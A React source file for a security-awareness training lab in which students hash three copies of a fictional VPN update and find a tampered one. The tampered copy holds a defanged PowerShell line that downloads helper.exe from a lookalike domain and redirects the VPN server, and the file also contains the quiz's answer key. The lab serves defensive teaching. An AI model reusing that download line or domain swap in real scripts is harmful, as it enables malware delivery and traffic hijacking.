"use client";

import { useMemo, useState } from "react";
import { ExternalLink, RotateCcw } from "lucide-react";
import {
  CHEF_SHA256,
  Deck,
  DownloadButton,
  Guide,
  Hash,
  HashCompare,
  HashPlayground,
  HashTool,
  nextHint,
  normHash,
  Options,
  Stepper,
  useDeck,
  useHashes,
  useLabDone,
  useSaved,
  Verdict,
  type DotStatus,
} from "./lab-kit";

// Week 2 lab: three copies of one IT update, one of them tampered with.
// Students hash every copy with a real tool, compare against the hash IT
// published, find what changed, and decide what to do. The files are plain
// text and the planted download address is defanged, so nothing here runs.

const HEADER = [
  "# PurveX Academy training file. This is not a real update. Do not run it.",
  "# PurveX Financial VPN profile update 2.4.1",
  "# Published by IT (Alex Rivera) on the IT portal. Staff laptops only.",
];
const GENUINE = [
  ...HEADER,
  '$Profile = "PurveX VPN"',
  '$Server  = "vpn.purvexfinancial.com"',
  "Set-VpnConnection -Name $Profile -ServerAddress $Server -SplitTunneling $false -Force",
  'Write-Host "PurveX VPN profile updated to 2.4.1"',
];
// Line 5 points the VPN at a lookalike domain (a digit 1 for the letter l),
// and line 7 is new: it pulls a program onto the laptop.
const TAMPERED = [
  ...HEADER,
  '$Profile = "PurveX VPN"',
  '$Server  = "vpn.purvexfinancia1.com"',
  "Set-VpnConnection -Name $Profile -ServerAddress $Server -SplitTunneling $false -Force",
  'Invoke-WebRequest "hxxps://purvexfinancia1[.]com/helper" -OutFile "$env:TEMP\\helper.exe"',
  'Write-Host "PurveX VPN profile updated to 2.4.1"',
];
const CHANGED_LINES = [4, 6];
const text = (lines: string[]) => lines.join("\n") + "\n";

interface Copy {
  id: string;
  tag: string;
  title: string;
  from: string;
  story: string;
  file: string;
  body: string;
  genuine: boolean;
  why: string;
}

const COPIES: Copy[] = [
  {
    id: "email",
    tag: "A",
    title: "Email attachment",
    from: "Alex Rivera, IT",
    story: "Sent to all staff at 8:02 this morning.",
    file: "vpn-update-email.txt",
    body: text(GENUINE),
    genuine: true,
    why: "Matches IT's hash exactly. This is the real update.",
  },
  {
    id: "share",
    tag: "B",
    title: "Shared drive",
    from: "\\\\fs01\\IT\\Updates",
    story: "Last modified at 2:47 this morning, five hours before IT sent it.",
    file: "vpn-update-share.txt",
    body: text(TAMPERED),
    genuine: false,
    why: "Different hash, so the file was changed. Someone replaced it overnight.",
  },
  {
    id: "teams",
    tag: "C",
    title: "Teams message",
    from: "PurveX IT Support (external account)",
    story: "An outside account says: install ASAP, VPN changes tonight.",
    file: "vpn-update-teams.txt",
    body: text(GENUINE),
    genuine: true,
    why: "The file matches. The sender is still a red flag. IT never uses outside accounts.",
  },
];
const BY_ID = Object.fromEntries(COPIES.map((c) => [c.id, c])) as Record<string, Copy>;

const EFFECT = [
  { key: "typo", text: "Nothing. It is a typo that would make the VPN fail to connect." },
  { key: "redirect", text: "Send the laptop's VPN traffic to an outside server and download a program onto the laptop." },
  { key: "delete", text: "Delete the files in the user's Temp folder." },
];

const QUESTIONS: { id: string; tag: string; title: string; prompt: string; options: { key: string; text: string }[]; answer: string; why: string }[] = [
  {
    id: "first",
    tag: "1",
    title: "Copy B",
    prompt: "Copy B is on the shared drive. What do you do first?",
    options: [
      { key: "delete", text: "Delete it and put the good copy back." },
      { key: "test", text: "Run it on a spare laptop to see what it does." },
      { key: "contain", text: "Pull it, keep it as evidence, warn staff and escalate with the hashes." },
      { key: "rehash", text: "Hash it again. The first one was probably wrong." },
    ],
    answer: "contain",
    why: "This is an incident, not a cleanup. Deleting destroys evidence and running it helps the attacker. Contain it and escalate.",
  },
  {
    id: "teams",
    tag: "2",
    title: "Copy C",
    prompt: "Copy C matched, but came from an outside account. Can staff use it?",
    options: [
      { key: "use", text: "Yes. The hash matched." },
      { key: "report", text: "Report it as phishing. Updates only come from the IT portal." },
      { key: "ignore", text: "Ignore it. It matched, so no harm done." },
    ],
    answer: "report",
    why: "A hash checks the file, not the sender. The next link may not match.",
  },
  {
    id: "limits",
    tag: "3",
    title: "The limit",
    prompt: "In 2017, CCleaner shipped malware from its own build. Why would a hash check miss it?",
    options: [
      { key: "type", text: "Hashes do not work on installers." },
      { key: "source", text: "The vendor published the hash of the bad file." },
      { key: "users", text: "Nobody knew how to hash a file." },
    ],
    answer: "source",
    why: "A hash proves a file matches its source, not that the source is safe. SolarWinds (2020) was the same.",
  },
];

const STEPS = ["Hash every copy", "Find the change", "Make the call", "Debrief"];

interface State {
  step: number;
  pasted: Record<string, string>;
  verdict: Record<string, "match" | "nomatch">;
  lines: number[];
  effect?: string;
  answers: Record<string, string>;
  checked: [boolean, boolean, boolean];
}
const START: State = { step: 0, pasted: {}, verdict: {}, lines: [], answers: {}, checked: [false, false, false] };
const STORE = "academy-lab-hash-verify-v1";

export function HashVerifyLab({ onDone }: { onDone?: () => void }) {
  const [s, setS] = useSaved<State>(STORE, START, (v) => Array.isArray(v.lines) && Array.isArray(v.checked));
  useLabDone(s.checked.every(Boolean), onDone);
  const hashes = useHashes({ official: text(GENUINE), ...Object.fromEntries(COPIES.map((c) => [c.id, c.body])) });
  const deck1 = useDeck(COPIES.length);
  const deck3 = useDeck(QUESTIONS.length);
  const [got, setGot] = useState<string[]>([]);

  const patch = (p: Partial<State>) => setS((prev) => ({ ...prev, ...p }));
  const go = (step: number) => {
    patch({ step });
    deck1.reset();
    deck3.reset();
    document.querySelector(".rt")?.scrollIntoView({ block: "start", behavior: "smooth" });
  };
  const check = (i: 0 | 1 | 2) => setS((prev) => ({ ...prev, checked: prev.checked.map((c, j) => (j === i ? true : c)) as State["checked"] }));

  const hashOk = (id: string) => Boolean(hashes[id]) && normHash(s.pasted[id] ?? "") === hashes[id];
  const truth = (c: Copy) => (c.genuine ? "match" : "nomatch");

  const score = useMemo(() => {
    const matched = COPIES.filter((c) => s.verdict[c.id] === truth(c)).length;
    const linesRight = s.lines.length === CHANGED_LINES.length && CHANGED_LINES.every((l) => s.lines.includes(l)) ? 1 : 0;
    const effect = s.effect === "redirect" ? 1 : 0;
    const calls = QUESTIONS.filter((q) => s.answers[q.id] === q.answer).length;
    return { matched, find: linesRight + effect, calls, total: matched + linesRight + effect + calls };
  }, [s]);

  const allHashed = COPIES.every((c) => hashOk(c.id) && s.verdict[c.id]);
  const reached = [true, s.checked[0], s.checked[1], s.checked[2]];

  return (
    <section className="rt" aria-label="The Update Nobody Can Vouch For lab">
      <Stepper steps={STEPS} step={s.step} done={[...s.checked, false]} reached={reached} onGo={go} />

      {s.step === 0 && (
        <div className="rt-body">
          <header className="rt-head">
            <h3>Which copies are real?</h3>
            <p>Hash each copy and compare it to IT&apos;s. Trust the hash, not how the file looks.</p>
          </header>
          <div className="lk-real">
            <b>IT portal · VPN update 2.4.1 · SHA-256</b>
            <Hash value={hashes.official} />
          </div>
          <details className="lk-more">
            <summary>New to hashes? Try one first</summary>
            <HashPlayground seed="PurveX VPN update 2.4.1" />
          </details>
          <Deck
            tags={COPIES.map((c) => c.tag)}
            titles={COPIES.map((c) => c.title)}
            index={deck1.card}
            dir={deck1.dir}
            onGo={deck1.show}
            status={COPIES.map((c): DotStatus => (s.checked[0] ? (s.verdict[c.id] === truth(c) ? "right" : "wrong") : hashOk(c.id) && s.verdict[c.id] ? "answered" : "open"))}
          >
            {(() => {
              const c = COPIES[deck1.card];
              const done = s.checked[0];
              const pasted = s.pasted[c.id] ?? "";
              const ok = hashOk(c.id);
              const right = s.verdict[c.id] === truth(c);
              return (
                <div className={`rt-ticket${done ? (right ? " is-right" : " is-wrong") : ""}`}>
                  <div className="rt-ticket__head">
                    <span className="rt-tag">{c.tag}</span>
                    <div>
                      <b>{c.title}</b>
                      <small>From {c.from}</small>
                      <p>{c.story}</p>
                    </div>
                  </div>
                  <Guide
                    steps={[
                      {
                        title: "Download this copy",
                        done: got.includes(c.id) || ok,
                        body: <DownloadButton name={c.file} text={c.body} onDone={() => setGot((g) => (g.includes(c.id) ? g : [...g, c.id]))} />,
                      },
                      {
                        title: "Hash it in CyberChef, then paste the hash here",
                        done: ok,
                        body: (
                          <>
                            <p className="lk-note">Drag the file into the Input box. Copy the Output.</p>
                            <a className="lk-mini" href={CHEF_SHA256} target="_blank" rel="noreferrer">
                              <ExternalLink aria-hidden="true" /> Open CyberChef
                            </a>
                            <label className="lk-field">
                              <span className="sr-only">SHA-256 of {c.file}</span>
                              <div>
                                <input
                                  type="text"
                                  value={pasted}
                                  disabled={done}
                                  spellCheck={false}
                                  autoComplete="off"
                                  placeholder="Paste the hash"
                                  onChange={(e) => patch({ pasted: { ...s.pasted, [c.id]: e.target.value } })}
                                />
                              </div>
                            </label>
                            {pasted && !ok && (
                              <p className="lk-note is-bad">{normHash(pasted).length !== 64 ? "A SHA-256 is 64 characters." : "Not this file's hash. Hash the file for this copy."}</p>
                            )}
                            {!ok && <HashTool mode="file" />}
                          </>
                        ),
                      },
                      {
                        title: "Does it match IT's hash?",
                        done: Boolean(s.verdict[c.id]),
                        body: (
                          <>
                            <HashCompare label={`Copy ${c.tag}`} mine={pasted} reference={hashes.official} />
                            <div className="rt-choice" role="radiogroup" aria-label={`Does copy ${c.tag} match?`} style={{ gridTemplateColumns: "repeat(2, minmax(0, 1fr))" }}>
                              {(["match", "nomatch"] as const).map((v) => (
                                <button
                                  key={v}
                                  type="button"
                                  role="radio"
                                  aria-checked={s.verdict[c.id] === v}
                                  disabled={done}
                                  className={done && v === truth(c) ? "is-answer" : ""}
                                  onClick={() => {
                                    const verdict = { ...s.verdict, [c.id]: v };
                                    patch({ verdict });
                                    deck1.next((i) => hashOk(COPIES[i].id) && Boolean(verdict[COPIES[i].id]));
                                  }}
                                >
                                  <b>{v === "match" ? "Matches" : "Does not match"}</b>
                                </button>
                              ))}
                            </div>
                          </>
                        ),
                      },
                    ]}
                  />
                  {done && <Verdict right={right}>{c.why}</Verdict>}
                </div>
              );
            })()}
          </Deck>
          <footer className="rt-foot">
            {s.checked[0] ? (
              <>
                <p className="rt-tally">
                  <b>{score.matched} of 3</b> called correctly
                </p>
                <button type="button" className="rt-btn rt-btn--primary" onClick={() => go(1)}>
                  Find the change
                </button>
              </>
            ) : (
              <>
                <p className="rt-tally">{nextHint(COPIES.map((c) => hashOk(c.id) && Boolean(s.verdict[c.id])), COPIES.map((c) => `copy ${c.tag}, ${c.title.toLowerCase()}`))}</p>
                <button type="button" className="rt-btn rt-btn--primary" disabled={!allHashed} onClick={() => check(0)}>
                  Check answers
                </button>
              </>
            )}
          </footer>
        </div>
      )}

      {s.step === 1 && (
        <div className="rt-body">
          <header className="rt-head">
            <h3>What did they change?</h3>
            <p>Copy B&apos;s hash did not match, so someone edited it. Compare it with IT&apos;s real copy to find the edits.</p>
          </header>
          <Guide
            steps={[
              {
                title: "Find the 2 lines in copy B that differ from IT's copy, and click them",
                done: s.lines.length > 0,
                body: (
                  <div className="lk-files">
                    <FileView label="IT's real copy" name={BY_ID.email.file} note="Matches IT's hash" lines={GENUINE} />
                    <FileView
                      label="Copy B"
                      name={BY_ID.share.file}
                      lines={TAMPERED}
                      picked={s.lines}
                      reveal={s.checked[1]}
                      onToggle={(n) => patch({ lines: s.lines.includes(n) ? s.lines.filter((x) => x !== n) : [...s.lines, n] })}
                    />
                  </div>
                ),
              },
              {
                title: "What would copy B do if someone ran it?",
                done: Boolean(s.effect),
                body: <Options label="What copy B does" options={EFFECT} value={s.effect} answer={s.checked[1] ? "redirect" : undefined} disabled={s.checked[1]} onPick={(effect) => patch({ effect })} />,
              },
            ]}
          />
          {s.checked[1] && (
            <div className="rt-why">
              <Verdict right={score.find === 2}>
                Line 5 swaps the letter l for the digit 1, pointing the VPN at the attacker. Line 7 downloads a program. Easy to miss by eye, impossible to miss by hash.
              </Verdict>
            </div>
          )}
          <footer className="rt-foot">
            {s.checked[1] ? (
              <>
                <p className="rt-tally">
                  <b>{score.find} of 2</b> right
                </p>
                <button type="button" className="rt-btn rt-btn--primary" onClick={() => go(2)}>
                  Make the call
                </button>
              </>
            ) : (
              <>
                <p className="rt-tally">{nextHint([s.lines.length > 0, Boolean(s.effect)], ["click the 2 changed lines", "say what copy B does"])}</p>
                <button type="button" className="rt-btn rt-btn--primary" disabled={!s.lines.length || !s.effect} onClick={() => check(1)}>
                  Check answers
                </button>
              </>
            )}
          </footer>
        </div>
      )}

      {s.step === 2 && (
        <div className="rt-body">
          <header className="rt-head">
            <h3>What happens next?</h3>
            <p>Three quick calls.</p>
          </header>
          <Deck
            tags={QUESTIONS.map((q) => q.tag)}
            titles={QUESTIONS.map((q) => q.title)}
            index={deck3.card}
            dir={deck3.dir}
            onGo={deck3.show}
            status={QUESTIONS.map((q): DotStatus => (s.checked[2] ? (s.answers[q.id] === q.answer ? "right" : "wrong") : s.answers[q.id] ? "answered" : "open"))}
          >
            {(() => {
              const q = QUESTIONS[deck3.card];
              const done = s.checked[2];
              const right = s.answers[q.id] === q.answer;
              return (
                <div className={`rt-ticket${done ? (right ? " is-right" : " is-wrong") : ""}`}>
                  <div className="lk-q">
                    <b>{q.prompt}</b>
                    <Options
                      label={q.title}
                      options={q.options}
                      value={s.answers[q.id]}
                      answer={done ? q.answer : undefined}
                      disabled={done}
                      onPick={(v) => {
                        const answers = { ...s.answers, [q.id]: v };
                        patch({ answers });
                        deck3.next((i) => Boolean(answers[QUESTIONS[i].id]));
                      }}
                    />
                  </div>
                  {done && <Verdict right={right}>{q.why}</Verdict>}
                </div>
              );
            })()}
          </Deck>
          <footer className="rt-foot">
            {s.checked[2] ? (
              <>
                <p className="rt-tally">
                  <b>{score.calls} of 3</b> right
                </p>
                <button type="button" className="rt-btn rt-btn--primary" onClick={() => go(3)}>
                  See the debrief
                </button>
              </>
            ) : (
              <>
                <p className="rt-tally">{nextHint(QUESTIONS.map((q) => Boolean(s.answers[q.id])), QUESTIONS.map((q) => `question ${q.tag}`))}</p>
                <button type="button" className="rt-btn rt-btn--primary" disabled={QUESTIONS.some((q) => !s.answers[q.id])} onClick={() => check(2)}>
                  Check answers
                </button>
              </>
            )}
          </footer>
        </div>
      )}

      {s.step === 3 && (
        <div className="rt-body">
          <header className="rt-head rt-head--result">
            <div className={`rt-grade rt-grade--${score.total >= 7 ? "high" : score.total >= 5 ? "medium" : "low"}`}>
              <b>{score.total}</b>
              <small>of 8</small>
            </div>
            <div>
              <h3>{score.total >= 7 ? "You would catch this one" : score.total >= 5 ? "Solid start" : "Worth another pass"}</h3>
              <p>
                Hashed {score.matched} of 3 · Found {score.find} of 2 · Called {score.calls} of 3
              </p>
            </div>
          </header>
          <p className="rt-lesson">A hash is a one-way fingerprint. It proves a file was not changed, but keeps nothing secret.</p>
          <div className="lk-real">
            <b>On the job</b>
            <p>Analysts hash suspicious files with CyberChef or sha256sum and look the hash up in MISP, the open-source threat-sharing platform. The hash goes in the ticket.</p>
          </div>
          <footer className="rt-foot">
            <p className="rt-tally">Check the hash. Then check the source.</p>
            <button type="button" className="rt-btn" onClick={() => setS(START)}>
              <RotateCcw aria-hidden="true" /> Try again
            </button>
          </footer>
        </div>
      )}
    </section>
  );
}

// Without onToggle the file is read-only, for showing IT's copy to compare against.
function FileView({
  label,
  name,
  note,
  lines,
  picked = [],
  reveal = false,
  onToggle,
}: {
  label: string;
  name: string;
  note?: string;
  lines: string[];
  picked?: number[];
  reveal?: boolean;
  onToggle?: (n: number) => void;
}) {
  return (
    <div className={`lk-file${onToggle ? "" : " is-ref"}`}>
      <div className="lk-file__bar">
        <span>
          <b>{label}</b> · {name}
        </span>
        <span>{note ?? (reveal ? "Green: changed. Red: you picked it, but it matches IT's copy." : "Click a line to pick it")}</span>
      </div>
      <ol>
        {lines.map((line, n) => {
          if (!onToggle)
            return (
              <li key={n}>
                <span>
                  <i>{n + 1}</i>
                  <span>{line}</span>
                </span>
              </li>
            );
          const isPicked = picked.includes(n);
          const changed = CHANGED_LINES.includes(n);
          const cls = reveal ? (changed ? "is-changed" : isPicked ? "is-miss" : "") : isPicked ? "is-picked" : "";
          return (
            <li key={n}>
              <button type="button" className={cls} disabled={reveal} aria-pressed={isPicked} onClick={() => onToggle(n)}>
                <i>{n + 1}</i>
                <span>{line}</span>
              </button>
            </li>
          );
        })}
      </ol>
    </div>
  );
}
